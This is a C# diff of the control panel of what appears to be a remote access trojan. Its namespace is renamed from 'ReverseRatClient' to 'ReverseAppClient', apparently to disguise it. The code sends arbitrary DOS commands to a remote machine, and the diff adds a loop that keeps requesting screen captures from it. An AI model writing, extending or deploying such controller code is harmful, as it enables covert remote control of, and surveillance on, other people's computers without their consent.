@@ -2,15 +2,18 @@
 using System.Drawing;
 using System.Drawing.Text;
 using System.Runtime.InteropServices;
+using System.Threading;
 using System.Windows.Forms;
 
-namespace ReverseRatClient
+namespace ReverseAppClient
 {
     public partial class PanelDeControl : Form
     {
         Miscelanea  Msc = new Miscelanea();
         //Create your private font collection object.
         PrivateFontCollection pfc = new PrivateFontCollection();
+        bool capturandoPantalla = false;
+
         public PanelDeControl()
         {
             InitializeComponent();
@@ -23,7 +26,7 @@ namespace ReverseRatClient
 
         private void ProcesarComandos(string comando)
         {
-            // Envia cualquier conmando DOS
+            // Envia cualquier comando DOS
             var pc = (Principal) Msc.DevolverMDI("Principal");
             pc.EnviarComando(comando, Text);
             
@@ -74,7 +77,7 @@ namespace ReverseRatClient
 
         private void button1_Click(object sender, EventArgs e)
         {
-            ProcesarComandos("<:hola:>");          
+               
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -102,9 +105,7 @@ namespace ReverseRatClient
 
         private void textBox1_KeyUp(object sender, KeyEventArgs e)
         {
-            //MessageBox.Show(e.KeyCode.ToString());
-
-         
+            //MessageBox.Show(e.KeyCode.ToString());        
             if (e.KeyCode != Keys.Return)
                 button2.PerformClick();           
             else
@@ -169,12 +170,36 @@ namespace ReverseRatClient
 
         private void button5_Click(object sender, EventArgs e)
         {
+            tabControl1.SelectTab(tabPage4);
             ProcesarComandos("<:captura:>");
         }
-
+         
         private void groupBox2_Enter(object sender, EventArgs e)
         {
 
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            ProcesarComandos("<:hola:>");
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            int contx = 0;
+            capturandoPantalla = true;
+            while (capturandoPantalla)
+            {
+                ProcesarComandos("<:captura:>");
+                textBox5.Text = contx.ToString();                
+                contx ++;
+                Application.DoEvents();
+            }
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            capturandoPantalla = false; 
         }
     }
 
